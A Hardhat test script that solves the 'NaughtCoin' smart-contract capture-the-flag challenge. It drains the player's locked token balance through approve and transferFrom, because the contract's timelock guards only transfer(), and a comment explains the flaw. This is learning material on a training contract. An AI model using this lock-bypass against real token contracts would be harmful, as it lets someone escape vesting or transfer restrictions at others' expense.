const { assert } = require("chai")
const { ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider
let player, sender, challenge, challengeAddress, tx

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]
    sender = accounts[1]

    challengeAddress = process.env.CHALLENGEADDRESS15 //address of my instance contract
    const challengeFactory = await ethers.getContractFactory(`NaughtCoin`)
    challenge = await challengeFactory.attach(challengeAddress)
})

it("Solves the challenge 'NaughtCoin'", async () => {
    let initialValue = await challenge.balanceOf(player.address)

    /*There is another methode to send tokens than only transfer.
    We could approve other contract to our tokens, and
    then transfer to it tokens. the gap in security in this 
    contract is not adding of modifikator to all of the
    function inherited from ERC20. */
    tx = await challenge.approve(sender.address, initialValue)
    await tx.wait(1)

    tx = await challenge.transferFrom(player.address, sender.address, initialValue)
    await tx.wait(1)

    let balance = (await challenge.balanceOf(player.address)).toString()
    assert(balance == "0", "There are tokens on the account!")
})
